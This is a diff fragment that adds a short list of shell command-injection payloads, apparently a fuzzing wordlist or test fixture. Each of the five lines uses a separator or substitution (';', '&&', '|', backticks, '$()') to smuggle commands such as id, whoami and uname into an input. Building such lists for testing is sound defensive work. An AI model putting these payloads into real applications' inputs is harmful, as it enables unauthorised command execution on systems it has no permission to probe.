@@ -1,0 +1,5 @@
+; id
+&& whoami
+| ls -la
+`uname -a`
+$(id)
